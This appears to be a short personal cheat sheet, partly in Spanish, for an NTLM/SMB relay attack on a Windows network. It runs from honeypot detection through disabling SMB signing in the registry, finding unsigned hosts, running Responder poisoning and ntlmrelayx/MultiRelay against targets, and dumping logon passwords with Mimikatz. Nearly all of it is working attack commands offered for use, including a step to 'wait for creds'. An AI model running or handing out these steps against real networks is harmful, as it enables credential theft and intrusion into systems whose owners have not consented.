```
Import-Module .\Invoke-HoneypotBuster.ps1
Invoke-HoneypotBuster
```

Shared Folder
```
\\ScanFolder\c$
```

Disable SMB Signing
```
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanmanWorkStation\Parameters" /v "RequireSecuritySignature" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanmanWorkStation\Parameters" /v "EnableSecuritySignature" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanmanServer\Parameters" /v "RequireSecuritySignature" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanmanServer\Parameters" /v "EnableSecuritySignature" /t REG_DWORD /d 0 /f
```


Comando de Busqueda herramientas:
```
find /usr/share/responder/ -name "MultiRelay.py" -print
find /usr/share/responder/ -name "ntlmrelayx.py" -print
```

1. Identify network systems that do not require SMB message validation to detect machine with SMB signing:disabled.
```
cd /usr/share/responder/tools/
python RunFinger.py -i 192.168.0.0/24
```
2. Configure Impacket’s NTLMrelayx to target those systems
```
echo "IP"  >> targets.txt
 ```   
 ```
 cd /usr/share/responder/tools
 python MultiRelay.py -t 192.168.0.4 -u ALL -d
 ntlmrelayx.py -tf targets.txt --smb2support
 ```
3. Disable SMB and HTTP response poisoning in Responder and launch
```
cd /usr/share/responder
```
```
gedit Responder.conf
```
4. Open the Responder.conf file and set the value of SMB and HTTP to Off
```
responder -I eth0 -rv
responder -I eth0 -rdw
```
5. Wait for creds
6. Invoke standard Mimikatz
```
mimi sekurlsa::logonpasswords
```



